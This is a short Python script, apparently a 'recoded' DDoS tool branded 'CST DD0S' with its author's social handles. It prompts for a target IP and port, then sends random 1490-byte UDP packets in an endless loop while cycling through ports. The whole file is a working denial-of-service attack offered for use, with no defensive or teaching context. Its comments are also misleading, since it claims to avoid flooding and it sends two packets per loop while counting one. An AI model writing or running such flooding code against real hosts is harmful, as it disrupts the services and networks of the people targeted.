import sys
import os
import time
import socket
import random

# Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Create a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random bytes
bytes = random._urandom(1490)

# Clear the screen and display information
os.system("clear")
print("""
Recode   : rius
You Tube : @riusz7
Github   :  github.com/rius-admin
Stop : CTRL + C
""")

# Get the target IP and port from the user
ip = input("IP Target : ")
port = int(input("Port       : "))

# Clear the screen and display the CST DD0S ASCII art
os.system("clear")
os.system("figlet CST DD0S")

# Send packets indefinitely
while True:
    try:
        # Send a packet to the target IP and port
        sock.sendto(bytes, (ip, port))
        
        # Print the number of packets sent
        print("Sent packet %d to %s throught port:%d" % (sock.sendto(bytes, (ip, port)), ip, port))
        
        # Sleep for a second to prevent flooding the target
        time.sleep(1)
        
        # Increment the port number
        port += 1
        
        # If the port number reaches 65535, start from port 1 again
        if port == 65535:
            port = 1
    
    # Handle CTRL + C interruption
    except KeyboardInterrupt:
        print("\nStopping...")
        sys.exit()
